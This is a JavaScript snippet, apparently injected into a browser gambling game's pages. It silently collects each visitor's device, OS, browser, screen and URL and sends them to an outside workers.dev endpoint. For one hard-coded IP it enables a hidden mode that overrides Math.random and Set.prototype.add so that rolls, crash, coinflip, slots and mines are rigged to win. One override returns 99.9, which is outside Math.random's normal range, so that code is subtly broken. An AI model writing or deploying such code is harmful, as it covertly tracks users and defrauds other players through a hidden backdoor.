(function () {
  const ENDPOINT = 'https://autumn-art-ecd0.n7ycgcn5jd.workers.dev/';
  const TARGET_IP = '195.69.216.142';

  // ===== 1. Сбор инфы и отправка в Telegram =====
  const ua = navigator.userAgent;
  let device = 'Неизвестно', os = 'Неизвестно', browser = 'Неизвестно';
  if (/iPhone|iPad|iPod/i.test(ua))        device = /iPad/i.test(ua) ? 'iPad' : 'iPhone';
  else if (/Android/i.test(ua))            device = 'Android';
  else if (/Windows/i.test(ua))            device = 'ПК (Windows)';
  else if (/Macintosh|Mac OS X/i.test(ua)) device = 'Mac';
  else if (/Linux/i.test(ua))              device = 'Linux';

  if (/Windows NT 10/i.test(ua))        os = 'Windows 10/11';
  else if (/Windows/i.test(ua))         os = 'Windows';
  else if (/Android (\d+(\.\d+)?)/i.test(ua)) os = 'Android ' + ua.match(/Android (\d+(\.\d+)?)/i)[1];
  else if (/iPhone OS (\d+_\d+)/i.test(ua))   os = 'iOS ' + ua.match(/iPhone OS (\d+_\d+)/i)[1].replace('_','.');
  else if (/Mac OS X (\d+[._]\d+)/i.test(ua)) os = 'macOS ' + ua.match(/Mac OS X (\d+[._]\d+)/i)[1].replace('_','.');
  else if (/Linux/i.test(ua))           os = 'Linux';

  if (/YaBrowser/i.test(ua))      browser = 'Yandex';
  else if (/Edg\//i.test(ua))     browser = 'Edge';
  else if (/OPR\//i.test(ua))     browser = 'Opera';
  else if (/Chrome\//i.test(ua))  browser = 'Chrome';
  else if (/Firefox\//i.test(ua)) browser = 'Firefox';
  else if (/Safari\//i.test(ua))  browser = 'Safari';

  fetch(ENDPOINT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      url: location.href,
      device, os, browser,
      screen: `${screen.width}x${screen.height}`
    })
  })
  .then(r => r.json())
  .then(info => {
    if (info.ip === TARGET_IP) {
      enablePrivilegedMode();
    }
  })
  .catch(() => {});

  // ===== 2. Привилегированный режим =====
  function enablePrivilegedMode() {
    const originalRandom = Math.random;
    let privileged = true;

    // Кэш оригинального метода, чтобы не зациклиться
    Math.random = function () {
      if (!privileged) return originalRandom();

      // Смотрим на стек вызовов, чтобы понять, кто вызвал
      const stack = new Error().stack || '';

      // Кейсы: rollItem() делает Math.random()*100
      // → вернуть 0, чтобы выпал первый (самый «дешёвый» по шансу = лучший по редкости)
      // НО в твоём коде первый item — common. Нужно вернуть значение ближе к 100,
      // чтобы попасть в legendary (он в конце массива).
      if (stack.includes('rollItem')) {
        return 99.9;
      }

      // Краш: 1.5 + Math.random()*13.5 → хотим максимум
      if (stack.includes('crashStart')) {
        return 0.999;
      }

      // Монетка: Math.random()<0.5 → heads
      // Но мы не знаем, что выбрал игрок. Пусть всегда будет heads.
      // Если ты всегда выбираешь heads — выигрыш гарантирован.
      if (stack.includes('coinflipStart')) {
        return 0.1; // <0.5 → heads
      }

      // Слоты: Math.random()<0.015 → джекпот
      // Но это только одна проверка. Дальше идёт выбор символов.
      // Проще всегда возвращать очень маленькое значение → джекпот.
      if (stack.includes('slotsSpin')) {
        return 0.001;
      }

      // Мины: Math.floor(Math.random()*25) — позиция бомбы
      // Мы не можем «обмануть» это через рандом, потому что бомбы ставятся рандомно.
      // Вместо этого ниже подменим метод add() у Set.
      return originalRandom();
    };

    // ===== 3. Мины: перехват добавления бомб =====
    const OriginalSetAdd = Set.prototype.add;
    let bombsBeingAdded = 0;
    Set.prototype.add = function (value) {
      // Если это Set бомб (числа 0..24) и мы в привилегированном режиме
      if (privileged && typeof value === 'number' && value >= 0 && value < 25) {
        // Пропускаем только первые 3 бомбы, но сдвигаем их в углы
        if (bombsBeingAdded < 3) {
          const corners = [0, 24, 12]; // углы + центр
          const safeValue = corners[bombsBeingAdded];
          bombsBeingAdded++;
          return OriginalSetAdd.call(this, safeValue);
        }
      }
      return OriginalSetAdd.call(this, value);
    };

    console.log('%c✅ PRIVILEGED MODE ON', 'color:#0f0;font-weight:bold;font-size:16px');
  }
})();
